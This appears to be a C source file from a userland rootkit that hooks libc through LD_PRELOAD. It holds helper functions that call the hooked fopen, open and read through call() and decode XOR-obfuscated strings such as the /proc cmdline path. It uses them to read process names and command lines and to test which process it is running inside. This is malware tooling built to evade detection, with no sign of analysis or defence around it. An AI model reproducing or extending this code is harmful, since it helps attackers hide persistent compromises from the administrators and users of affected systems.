#include "../hooks/libdl/libdl.h"

char *get_process_name(pid_t pid){
    char *process_name = (char *)malloc(512),
         process_path[PATH_MAX];
    FILE *cmdline_fp;

    hook(CFOPEN);

    xor(cmdline_path, CMDLINE_PATH);
    (void)snprintf(process_path, sizeof(process_path) - 1, cmdline_path, pid);
    clean(cmdline_path);

    if((cmdline_fp = call(CFOPEN, process_path, "r")) == NULL){
        xor(bstr, BASH_STR);
        (void)strncpy(process_name, bstr, 5);
        clean(bstr);
    }else (void)fread(process_name, 511, 1, cmdline_fp);
    if(cmdline_fp) (void)fclose(cmdline_fp);
    
    return process_name;
}

char *get_process_cmdline(pid_t pid){
    int c, fd;
    char *process_cmdline = (char *)malloc(512),
         process_path[PATH_MAX];

    hook(COPEN,
         CREAD);

    xor(cmdline_path, CMDLINE_PATH);
    (void)snprintf(process_path, sizeof(process_path) - 1, cmdline_path, pid);
    clean(cmdline_path);

    if((fd = (long)call(COPEN, process_path, 0, 0)) < 0){
        xor(bstr, BASH_STR);
        (void)strncpy(process_cmdline, bstr, 5);
        clean(bstr);
    }else{
        c = (long)call(CREAD, fd, process_cmdline, 512);
        for(int i = 0; i < c; i++) if(process_cmdline[i] == 0x00) process_cmdline[i] = 0x20;
    }
    if(fd) (void)close(fd);
    return process_cmdline;
}

int cmp_process(char *name){
    return !strncmp(process_name(), name, strlen(name));
}
char *str_process(char *name){
    return strstr(process_name(), name);
}
int process(char *name){
    if(cmp_process(name)) return 1;
    if(str_process(name)) return 1;
    return 0;
}
int xprocess(const char *name){
    int ret = 0;
    xor(_name, name);
    if(cmp_process(_name)) ret = 1;
    if(str_process(_name)) ret = 1;
    clean(_name);
    return ret;
}